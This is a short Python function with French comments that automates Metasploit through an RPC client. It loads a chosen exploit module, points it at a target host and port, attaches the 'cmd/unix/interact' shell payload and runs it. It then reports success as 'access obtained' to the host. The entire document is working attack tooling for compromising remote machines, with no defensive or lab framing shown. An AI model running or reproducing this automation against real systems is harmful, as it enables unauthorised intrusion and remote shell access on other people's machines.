def exploit_vulnerability(client, host, port, exploit_module):
    try:
        # Charger l'exploit
        exploit = client.modules.use('exploit', exploit_module)
        exploit['RHOSTS'] = host
        exploit['RPORT'] = port

        # Configurer le payload
        payload = client.modules.use('payload', 'cmd/unix/interact')

        # Exécuter l'exploit
        console = client.consoles.console().run_module_with_output(exploit, payload)
        print(console)

        print(f"[+] Exploitation réussie avec {exploit_module} ! Accès obtenu à {host}:{port}")
    except Exception as e:
        print(f"[-] Échec de l'exploitation avec {exploit_module} : {e}")
